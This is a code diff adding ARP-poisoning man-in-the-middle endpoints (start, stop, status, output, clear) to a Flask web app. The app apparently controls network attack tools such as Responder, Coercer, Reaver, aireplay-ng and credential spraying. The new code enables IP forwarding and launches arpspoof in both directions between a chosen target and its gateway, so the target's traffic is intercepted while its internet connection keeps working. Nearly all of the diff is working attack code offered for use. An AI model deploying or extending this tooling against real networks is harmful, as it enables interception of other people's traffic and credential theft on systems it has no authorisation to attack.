@@ -376,6 +376,18 @@ cred_spray_lock = threading.Lock()
 coerce_state = {'running': False, 'process': None, 'start_time': None, 'method': '', 'target': ''}
 coerce_lock = threading.Lock()
 
+# Global state for ARP spoof MITM (IPv4 ARP poisoning — replaces mitm6)
+arpspoof_state = {
+    'running': False, 'start_time': None,
+    'target_ip': None, 'gateway_ip': None,
+    'interface': '',
+    'proc': None,           # Single Popen (-r does both directions)
+    'log_fh': None,         # File handle for log output
+    'log_position': 0,      # Seek position for output tailing
+    'packet_count': 0
+}
+arpspoof_lock = threading.Lock()
+
 # Global state for recon scan (arp-scan + nxc)
 recon_state = {'running': False, 'process': None, 'start_time': None, 'subnet': '', 'interface': '', 'phase': ''}
 recon_lock = threading.Lock()
@@ -4650,6 +4662,7 @@ def kill_all():
         'responder',
         'coercer',
         'arp-scan',
+        'arpspoof',
     ]
 
     for proc in processes_to_kill:
@@ -4666,6 +4679,9 @@ def kill_all():
     result = subprocess.run(['pkill', '-9', '-f', 'nxc'], capture_output=True)
     if result.returncode == 0:
         killed.append('nxc')
+
+    # Disable IP forwarding (critical safety — ARP spoof cleanup)
+    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
 
     # Reset tracking state — Page 1
     live_attack['running'] = False
@@ -4696,6 +4712,22 @@ def kill_all():
         recon_state['phase'] = ''
         recon_state['subnet'] = ''
         recon_state['interface'] = ''
+    with arpspoof_lock:
+        fh = arpspoof_state.get('log_fh')
+        if fh:
+            try:
+                fh.close()
+            except OSError:
+                pass
+        arpspoof_state['running'] = False
+        arpspoof_state['start_time'] = None
+        arpspoof_state['target_ip'] = None
+        arpspoof_state['gateway_ip'] = None
+        arpspoof_state['interface'] = ''
+        arpspoof_state['proc'] = None
+        arpspoof_state['log_fh'] = None
+        arpspoof_state['log_position'] = 0
+        arpspoof_state['packet_count'] = 0
 
     if killed:
         output = f"Killed: {', '.join(killed)}"
@@ -4728,7 +4760,7 @@ def stop_current():
         killed.append('orchestrator')
     
     # Kill common attack processes that might be running (ALL pages)
-    for proc in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'bully', 'nmap', 'responder', 'coercer', 'arp-scan']:
+    for proc in ['airodump-ng', 'aireplay-ng', 'hcxdumptool', 'reaver', 'bully', 'nmap', 'responder', 'coercer', 'arp-scan', 'arpspoof']:
         result = subprocess.run(['pkill', '-9', proc], capture_output=True)
         if result.returncode == 0:
             killed.append(proc)
@@ -4742,6 +4774,9 @@ def stop_current():
     result = subprocess.run(['pkill', '-9', '-f', 'nxc'], capture_output=True)
     if result.returncode == 0:
         killed.append('nxc')
+
+    # Disable IP forwarding (ARP spoof cleanup)
+    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
 
     # Reset Internal page state
     with nmap_scan_lock:
@@ -4767,6 +4802,22 @@ def stop_current():
         recon_state['phase'] = ''
         recon_state['subnet'] = ''
         recon_state['interface'] = ''
+    with arpspoof_lock:
+        fh = arpspoof_state.get('log_fh')
+        if fh:
+            try:
+                fh.close()
+            except OSError:
+                pass
+        arpspoof_state['running'] = False
+        arpspoof_state['start_time'] = None
+        arpspoof_state['target_ip'] = None
+        arpspoof_state['gateway_ip'] = None
+        arpspoof_state['interface'] = ''
+        arpspoof_state['proc'] = None
+        arpspoof_state['log_fh'] = None
+        arpspoof_state['log_position'] = 0
+        arpspoof_state['packet_count'] = 0
 
     if killed:
         output = f"Stopped: {', '.join(killed)}"
@@ -7449,6 +7500,261 @@ def internal_responder_status():
         'hash_count': hash_count,
         'start_time': start_time
     })
+
+
+# ========== ARP SPOOF MITM (IPv4 ARP Poisoning) ==========
+
+@app.route('/api/internal/arpspoof/start', methods=['POST'])
+def internal_arpspoof_start():
+    """Start ARP spoof MITM — poisons target + gateway bidirectionally with -r flag.
+    Enables IP forwarding so target keeps internet while we intercept."""
+    data = request.json or {}
+    target_ip = data.get('target_ip', '')
+    gateway_ip = data.get('gateway_ip', '')
+    interface = data.get('interface', 'alfa1')
+
+    VALID_INTERFACES = {'alfa0', 'alfa1', 'eth0', 'wlan0', 'wlan1'}
+    if interface not in VALID_INTERFACES:
+        return jsonify({'success': False, 'error': f'Invalid interface: {interface}'}), 400
+
+    if not target_ip or not re.match(r'^[0-9.]+$', target_ip):
+        return jsonify({'success': False, 'error': 'Invalid or missing target IP'}), 400
+
+    # Auto-detect gateway if not provided
+    if not gateway_ip:
+        try:
+            result = subprocess.run(['ip', 'route', 'show', 'default', 'dev', interface],
+                                    capture_output=True, text=True, timeout=5)
+            match = re.search(r'default via (\d+\.\d+\.\d+\.\d+)', result.stdout)
+            if match:
+                gateway_ip = match.group(1)
+        except (subprocess.TimeoutExpired, OSError):
+            pass
+
+    if not gateway_ip or not re.match(r'^[0-9.]+$', gateway_ip):
+        return jsonify({'success': False, 'error': 'Could not detect gateway — provide gateway_ip manually'}), 400
+
+    # Check if already running
+    with arpspoof_lock:
+        if arpspoof_state['running']:
+            return jsonify({'success': False, 'error': 'ARP spoof is already running'}), 409
+
+    # Create log directory
+    log_dir = os.path.join(CAPTURE_DIR, 'arpspoof')
+    os.makedirs(log_dir, exist_ok=True)
+
+    log_path = os.path.join(log_dir, 'arpspoof.log')
+    try:
+        log_fh = open(log_path, 'w')
+    except OSError as e:
+        return jsonify({'success': False, 'error': f'Cannot open log file: {e}'}), 500
+
+    # Enable IP forwarding BEFORE starting arpspoof (so target doesn't lose internet)
+    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'], capture_output=True)
+
+    # Launch arpspoof with -r (both directions in ONE process)
+    try:
+        proc = subprocess.Popen(
+            ['arpspoof', '-i', interface, '-t', target_ip, '-r', gateway_ip],
+            stdout=log_fh, stderr=subprocess.STDOUT,
+            start_new_session=True
+        )
+    except (OSError, FileNotFoundError) as e:
+        log_fh.close()
+        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
+        return jsonify({'success': False, 'error': f'Failed to start arpspoof: {e}'}), 500
+
+    # Wait briefly, verify alive
+    time.sleep(1)
+    if proc.poll() is not None:
+        log_fh.close()
+        subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
+        err_detail = ''
+        try:
+            with open(log_path, 'r') as f:
+                err_detail = f.read()[-500:]
+        except OSError:
+            pass
+        return jsonify({'success': False, 'error': f'arpspoof died on startup: {err_detail}'}), 500
+
+    # Store state
+    with arpspoof_lock:
+        arpspoof_state['running'] = True
+        arpspoof_state['start_time'] = time.time()
+        arpspoof_state['target_ip'] = target_ip
+        arpspoof_state['gateway_ip'] = gateway_ip
+        arpspoof_state['interface'] = interface
+        arpspoof_state['proc'] = proc
+        arpspoof_state['log_fh'] = log_fh
+        arpspoof_state['log_position'] = 0
+        arpspoof_state['packet_count'] = 0
+
+    # Write PID file (backup for crash cleanup)
+    try:
+        with open('/tmp/arpspoof_pid.txt', 'w') as f:
+            f.write(str(proc.pid))
+    except OSError:
+        pass
+
+    return jsonify({
+        'success': True,
+        'target': target_ip,
+        'gateway': gateway_ip,
+        'pid': proc.pid
+    })
+
+
+@app.route('/api/internal/arpspoof/stop', methods=['POST'])
+def internal_arpspoof_stop():
+    """Stop ARP spoof and disable IP forwarding"""
+    # Snapshot proc under lock
+    with arpspoof_lock:
+        proc = arpspoof_state.get('proc')
+        arpspoof_state['running'] = False
+
+    # Kill process
+    if proc and proc.poll() is None:
+        try:
+            os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
+        except (ProcessLookupError, OSError):
+            pass
+        try:
+            proc.wait(timeout=3)
+        except subprocess.TimeoutExpired:
+            try:
+                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
+            except (ProcessLookupError, OSError):
+                pass
+
+    # Safety net
+    subprocess.run(['pkill', '-9', 'arpspoof'], capture_output=True)
+
+    # CRITICAL: Disable IP forwarding
+    subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
+
+    # Clean up PID file
+    try:
+        os.remove('/tmp/arpspoof_pid.txt')
+    except OSError:
+        pass
+
+    # Close log file handle and reset state
+    with arpspoof_lock:
+        fh = arpspoof_state.get('log_fh')
+        if fh:
+            try:
+                fh.close()
+            except OSError:
+                pass
+        arpspoof_state['start_time'] = None
+        arpspoof_state['target_ip'] = None
+        arpspoof_state['gateway_ip'] = None
+        arpspoof_state['interface'] = ''
+        arpspoof_state['proc'] = None
+        arpspoof_state['log_fh'] = None
+        arpspoof_state['log_position'] = 0
+        arpspoof_state['packet_count'] = 0
+
+    return jsonify({'success': True})
+
+
+@app.route('/api/internal/arpspoof/status', methods=['GET'])
+def internal_arpspoof_status():
+    """Get ARP spoof status and packet count"""
+    # Check PID file for process alive
+    running = False
+    pid = None
+    try:
+        with open('/tmp/arpspoof_pid.txt', 'r') as f:
+            pid = int(f.read().strip())
+        os.kill(pid, 0)  # Check alive
+        running = True
+    except (ValueError, ProcessLookupError, FileNotFoundError, OSError):
+        pass
+
+    with arpspoof_lock:
+        state_running = arpspoof_state['running']
+        target_ip = arpspoof_state['target_ip']
+        gateway_ip = arpspoof_state['gateway_ip']
+        interface = arpspoof_state['interface']
+        start_time = arpspoof_state['start_time']
+
+        # Sync: if process died but state says running, auto-cleanup
+        if not running and state_running:
+            arpspoof_state['running'] = False
+            subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'], capture_output=True)
+
+    # Count packets from log file (each line with "arp reply" = one packet)
+    packet_count = 0
+    log_path = os.path.join(CAPTURE_DIR, 'arpspoof', 'arpspoof.log')
+    if os.path.exists(log_path):
+        try:
+            with open(log_path, 'r') as f:
+                for line in f:
+                    if line.strip():
+                        packet_count += 1
+        except OSError:
+            pass
+
+    return jsonify({
+        'running': running,
+        'target_ip': target_ip,
+        'gateway_ip': gateway_ip,
+        'interface': interface,
+        'start_time': start_time,
+        'packet_count': packet_count,
+        'pid': pid
+    })
+
+
+@app.route('/api/internal/arpspoof/output', methods=['GET'])
+def internal_arpspoof_output():
+    """Get new arpspoof output since last poll — tails log file using seek position"""
+    log_path = os.path.join(CAPTURE_DIR, 'arpspoof', 'arpspoof.log')
+
+    with arpspoof_lock:
+        position = arpspoof_state['log_position']
+
+    events = []
+    if os.path.exists(log_path):
+        try:
+            with open(log_path, 'r') as f:
+                f.seek(position)
+                chunk = f.read()
+                new_pos = f.tell()
+            with arpspoof_lock:
+                arpspoof_state['log_position'] = new_pos
+            for line in chunk.splitlines():
+                line = line.strip()
+                if not line:
+                    continue
+                # Classify output lines
+                if 'arp reply' in line.lower() or 'is-at' in line.lower():
+                    events.append({'type': 'arp_reply', 'message': line})
+                elif 'cleanup' in line.lower() or 'closing' in line.lower():
+                    events.append({'type': 'cleanup', 'message': line})
+                else:
+                    events.append({'type': 'info', 'message': line})
+        except OSError:
+            pass
+
+    return jsonify({'success': True, 'events': events})
+
+
+@app.route('/api/internal/arpspoof/clear', methods=['POST'])
+def internal_arpspoof_clear():
+    """Clear arpspoof log and reset counters"""
+    log_path = os.path.join(CAPTURE_DIR, 'arpspoof', 'arpspoof.log')
+    try:
+        if os.path.exists(log_path):
+            open(log_path, 'w').close()
+    except OSError:
+        pass
+
+    with arpspoof_lock:
+        arpspoof_state['packet_count'] = 0
+        arpspoof_state['log_position'] = 0
+    return jsonify({'success': True})
 
 
 @app.route('/api/internal/hashes', methods=['GET'])
